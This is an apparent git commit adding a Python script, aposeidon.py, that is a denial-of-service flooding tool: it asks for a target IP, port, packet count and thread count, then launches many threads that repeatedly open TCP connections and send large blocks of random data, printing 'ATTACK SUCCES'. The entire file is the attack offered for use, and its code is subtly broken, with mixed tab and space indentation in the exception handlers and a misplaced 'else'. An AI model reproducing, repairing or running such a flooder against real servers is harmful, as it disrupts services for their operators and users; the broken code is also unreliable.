203eab2ea8475160295cf24fba3403192d0c33f3
Diskipro35 <113114742+Diskipro35@users.noreply.github.com>
2022-09-09 19:36:14 +0700

    Add files via upload

---
+++ aposeidon.py
@@ -0,0 +1,253 @@
+import random
+import socket
+import threading
+import os,sys
+os.system("clear")
+print("Code By Phoenix")
+print("Phoenix X Staff Amazed")
+ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+choice = str(input("GAS NIH BRE?(y/n):"))
+times = int(input("PACKET:"))
+threads = int(input("THREADS:"))
+os.system("clear")
+def run():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run2():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run3():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+
+def run4():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run5():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run6():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run7():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+
+def run8():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run9():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run10():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run11():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+
+def run12():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+	        s.close() 
+			print(i +"ATTACK SUCCES ")
+            
+def run13():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+
+def run14():
+	data = random._urandom(600000)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"CONNECT ")
+		except:
+		    s.close() 
+			print(i +"ATTACK SUCCES ")
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+        th = threading.Thread(target = run6)
+        th.start()
+        th = threading.Thread(target = run7)
+        th.start()
+        th = threading.Thread(target = run8)
+        th.start()
+        th = threading.Thread(target = run9)
+        th.start()
+        th = threading.Thread(target = run10)
+        th.start()
+        th = threading.Thread(target = run11)
+        th.start()
+        th = threading.Thread(target = run12)
+        th.start()
+        th = threading.Thread(target = run13)
+        th.start()
+else:
+        th = threading.Thread(target = run14)
+        th.start()
